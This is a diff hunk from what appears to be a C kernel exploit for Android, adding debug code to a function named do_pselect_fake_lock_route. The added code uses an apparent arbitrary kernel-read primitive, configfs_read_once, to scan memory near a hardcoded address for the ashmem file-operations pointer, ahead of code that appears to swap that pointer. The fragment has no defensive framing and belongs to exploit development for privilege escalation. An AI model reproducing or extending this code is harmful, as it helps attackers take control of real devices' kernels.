@@ -116,6 +116,20 @@ void do_pselect_fake_lock_route(void) {
     return;
   }
 
+    /* DEBUG: scan ashmem_miscs for fops pointer */
+  uint64_t expected = canon_addr(ASHMEM_FOPS);
+  pr_info("DEBUG: scanning for ashmem_fops=%016llx\n", (unsigned long long)expected);
+  for (int off = 0; off < 0x40; off += 8) {
+    uint64_t val = 0;
+    ssize_t ret = configfs_read_once(fd, canon_addr(0x02484c20 + off), &val, 8);
+    pr_info("DEBUG: ashmem_miscs+%02x ret=%zd val=%016llx\n", off, ret, (unsigned long long)val);
+    if (val == expected) {
+      pr_success("DEBUG: FOUND fops at ashmem_miscs+%02x\n", off);
+    }
+  }
+  close(fd);
+  return;
+  
   uintptr_t misc_fops = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
   uint64_t pre_fops = 0;
